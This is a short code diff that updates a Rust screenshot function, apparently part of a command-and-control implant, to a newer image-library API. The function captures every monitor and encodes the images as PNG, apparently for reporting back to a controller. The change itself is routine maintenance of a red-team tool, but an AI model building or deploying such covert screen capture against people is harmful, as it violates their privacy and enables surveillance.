@@ -7,7 +7,7 @@ use pb::c2::report_file_request;
 use pb::{c2, eldritch};
 use xcap::Monitor;
 use std::io::Cursor;
-use image::ImageOutputFormat;
+use image::ImageFormat;
 
 pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
     let monitors = Monitor::all().map_err(|e| e.to_string())?;
@@ -28,7 +28,8 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
 
         // Convert to PNG in memory
         let mut buffer = Cursor::new(Vec::new());
-        image.write_to(&mut buffer, ImageOutputFormat::Png)
+        image
+            .write_to(&mut buffer, ImageFormat::Png)
             .map_err(|e| e.to_string())?;
 
         let content = buffer.into_inner();
